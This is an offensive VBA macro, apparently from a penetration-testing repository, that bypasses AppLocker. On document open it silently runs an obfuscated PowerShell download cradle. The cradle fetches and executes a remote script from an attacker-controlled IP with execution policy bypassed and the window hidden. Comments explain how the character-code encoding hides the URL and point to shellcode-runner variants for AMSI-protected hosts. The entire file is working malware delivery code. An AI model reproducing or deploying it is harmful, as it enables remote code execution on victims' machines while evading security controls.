' Alternative AppLocker path: run the payload directly from VBA.
'
' VBA macros run inside the allowed Office process (winword.exe), so AppLocker's
' executable/script rules do not apply to them. There is no need for the InstallUtil
' LOLBin chain — just have the macro run the download cradle itself.
'
' Strings are "fruited" (ASCII -> decimal Chr()) so no plaintext URL sits in the
' document. Regenerate with vbagen.py when you change the IP.
'
' If PowerShell itself is locked down (CLM/AMSI), use the in-memory shellcode runner
' macros instead: ../xor-shellcode-runner/, ../alternative-shellcode-runner/, ../caesar-cipher/.

Sub AutoOpen()
    Dim cmd As String
    cmd = Chr(112) & Chr(111) & Chr(119) & Chr(101) & Chr(114) & Chr(115) & Chr(104) & Chr(101) & Chr(108) & Chr(108) & Chr(32) & Chr(45) & Chr(101) & Chr(120) & Chr(101) & Chr(99) & Chr(32) & Chr(98) _
     & Chr(121) & Chr(112) & Chr(97) & Chr(115) & Chr(115) & Chr(32) & Chr(45) & Chr(110) & Chr(111) & Chr(112) & Chr(32) & Chr(45) & Chr(119) & Chr(32) & Chr(104) & Chr(105) & Chr(100) & Chr(100) _
     & Chr(101) & Chr(110) & Chr(32) & Chr(45) & Chr(99) & Chr(32) & Chr(105) & Chr(101) & Chr(120) & Chr(40) & Chr(40) & Chr(110) & Chr(101) & Chr(119) & Chr(45) & Chr(111) & Chr(98) & Chr(106) _
     & Chr(101) & Chr(99) & Chr(116) & Chr(32) & Chr(110) & Chr(101) & Chr(116) & Chr(46) & Chr(119) & Chr(101) & Chr(98) & Chr(99) & Chr(108) & Chr(105) & Chr(101) & Chr(110) & Chr(116) & Chr(41) _
     & Chr(46) & Chr(100) & Chr(111) & Chr(119) & Chr(110) & Chr(108) & Chr(111) & Chr(97) & Chr(100) & Chr(115) & Chr(116) & Chr(114) & Chr(105) & Chr(110) & Chr(103) & Chr(40) & Chr(39) & Chr(104) _
     & Chr(116) & Chr(116) & Chr(112) & Chr(58) & Chr(47) & Chr(47) & Chr(49) & Chr(57) & Chr(50) & Chr(46) & Chr(49) & Chr(54) & Chr(56) & Chr(46) & Chr(52) & Chr(53) & Chr(46) & Chr(49) _
     & Chr(55) & Chr(55) & Chr(47) & Chr(114) & Chr(117) & Chr(110) & Chr(46) & Chr(116) & Chr(120) & Chr(116) & Chr(39) & Chr(41) & Chr(41)  ' powershell download cradle -> http://<IP>/run.txt

    ' Run hidden, don't wait for the process to exit
    Shell cmd, vbHide
End Sub

Sub Document_Open()
    AutoOpen
End Sub
